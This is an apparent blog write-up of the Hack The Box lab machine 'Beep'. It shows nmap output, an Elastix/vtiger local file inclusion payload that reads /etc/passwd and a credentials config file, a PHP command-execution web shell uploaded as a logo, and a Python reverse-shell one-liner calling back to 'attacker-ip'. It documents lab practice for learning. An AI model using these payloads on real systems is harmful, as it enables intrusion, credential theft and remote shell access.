---
title: Beep
date: 2020-12-05 00:06:06 +/-TTTT
categories: [CTF, hackthebox]
tags: [lfi, sudo]
---

![infocar](/assets/htb/beep/infocard.png)

beep is an easy box that has 20 points. box has a lfi vulnerability which gives us creds to login. then we use file upload vuln to get a shell. privs is done by using sudo.

## Enumeration

as always we start with Nmap

```nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-03 08:13 EST
Nmap scan report for 10.10.10.7
Host is up (0.62s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: RESP-CODES USER UIDL LOGIN-DELAY(0) APOP IMPLEMENTATION(Cyrus POP3 server v2) EXPIRE(NEVER) AUTH-RESP-CODE PIPELINING STLS TOP
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
443/tcp   open  ssl/https?
|_ssl-date: 2020-12-03T14:18:21+00:00; +1h01m04s from scanner time.
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: 1h01m03s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 377.37 seconds
```

Nmap shows various services are open. Let's start with the webpage.
there is an Elastix login page.

![homepage](/assets/htb/beep/homepage.png)

tried some default password like elastix:elastix admin:admin , admin:password, admin:elastix but none of them are corrected. also tried to sqli but it's not vulnerable.

Let's continue our enumeration with directory scanning.
use ffuf to brute-force found one directory `vtigercrm` . which have another login page. 

![vtiger](/assets/htb/beep/vtiger.png)

also webmin is hosted on port 10000

![webmin](/assets/htb/beep/webmin.png)

Let's search for an exploit for Elastix and webmin.

![ex-webmin](/assets/htb/beep/ex-webmin.png)

![ex-elastic](/assets/htb/beep/ex-elastix.png)


Local file inclusion in elastix looks interesting let's try this.

so we get lfi by using ` /vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action`

by using payload we got `/etc/passwd` file.

![lfi](/assets/htb/beep/lfi.png)

next we try to find password in `conf` file. 

Elastix store its password in `/etc/elastix.conf` file. 

![creds](/assets/htb/beep/creds.png)

## Gaining shell

we got creds for admin, Cyrus, and the MySQL root user.
tried these creds to login to MySQL but it doesn't allow my IP to connect to mysql server.

 I also tried ssh using creds but it failed.

next, I tried creds on Elastix,Webmin, and vtiger. it works on Elastix and vtiger cms.
I tried to get a reverse shell from elastix but I cant find any way to upload shell.so I move on vtiger . 

after some enumaration i found that we can upload logo image in `admin >> settings >> Company Details`  .

![logo](/assets/htb/beep/logo.png)

lets craft php reverse shell.
create php cmd execution payload'
`<?php system($_GET["cmd"]); ?>` and upload it .

view source code to find out where the is file uploaded.

![shellpath](/assets/htb/beep/shellpath.png)

navigate that file and now I can execute cmd.

![cmdexec](/assets/htb/beep/cmdexe.png)

using python got revershell on the box.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![reversehll](/assets/htb/beep/revshell.png)

there are two user fenis and spamfilter . in fenis home directory we got `user.txt`

![user](/assets/htb/beep/user.png)

## Getting root

root privs is easy on this box. we can run a bunch of programs as root.

![sudo](/assets/htb/beep/sudo.png)

l use Nmap to get root shell.

![root](/assets/htb/beep/root.png)
